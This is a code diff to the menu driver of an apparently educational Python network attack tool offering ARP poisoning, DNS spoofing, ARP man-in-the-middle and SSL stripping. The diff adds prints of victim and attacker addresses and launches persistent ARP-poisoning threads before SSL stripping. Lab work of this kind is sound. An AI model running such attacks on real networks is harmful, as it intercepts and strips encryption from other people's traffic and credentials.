@@ -34,13 +34,34 @@ def main():
     ipServerLAN = devicesListLAN[1]['ip']
     macServerLAN = devicesListLAN[1]['mac']
 
+    print(interfaceNAT)
+    print(interfaceLAN)
+
+
+    print("#######################################")
+    # print(recon.scan_network(interfaceNAT))
+    print("Target IP LAN(M1): {}".format(ipVictimLAN))
+    print("Target MAC LAN(M1): {}\n".format(macVictimLAN))
+    print("Gateway(Server) LAN IP (M2): {}".format(ipServerLAN))
+    print("Gateway(Server) LAN MAC (M2): {}\n".format(macServerLAN))
+    print("Attacker IP (M3) LAN: {}".format(ipAttackerLAN))    
+    print("Attacker MAC (M3) LAN: {}\n".format(macAttackerLAN))
+    print("Target IP NAT(M1): {}".format(ipVictimNAT))
+    print("Target MAC NAT(M1): {}\n".format(macVictimNAT))
+    print("Gateway(Server) NAT IP (M2): {}".format(ipGateway))
+    print("Gateway(Server) NAT MAC (M2): {}\n".format(macGateway))
+    print("Attacker IP (M3) NAT: {}".format(ipAttackerNAT))    
+    print("Attacker MAC (M3) NAT: {}".format(macAttackerNAT))
+    print("#######################################\n\n\n")
+
+
     print("Please choose an attack:")
     print("A. ARP Poisoning")
     print("B. DNS Spoofing")
     print("C. ARP Listener")
     print("D. ARP MITM")
     print("E. SSL Stripping")
-    attack = input("Enter your choice: ")
+    attack = raw_input("Enter your choice: ")
     print("\n\n\n")
     
     if attack.lower() == "a":
@@ -55,6 +76,10 @@ def main():
         arp_mitm_gateway.spoof(ipGateway, ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT)
     elif attack.lower() == "e":
         print("SSL Stripping...")
+        arp_poison_thread_victim = threading.Thread(target=arp_poison.persistentPoisoningVictim, args=(ipVictimLAN, macVictimLAN, ipServerLAN, macAttackerLAN, interfaceLAN))
+        arp_poison_thread_server = threading.Thread(target=arp_poison.persistentPoisoningServer, args=(ipServerLAN, macServerLAN, ipVictimLAN, macAttackerLAN, interfaceLAN))
+        arp_poison_thread_victim.start()
+        arp_poison_thread_server.start()
         ssl_strip.ssl_strip(interfaceNAT)
 
     else:
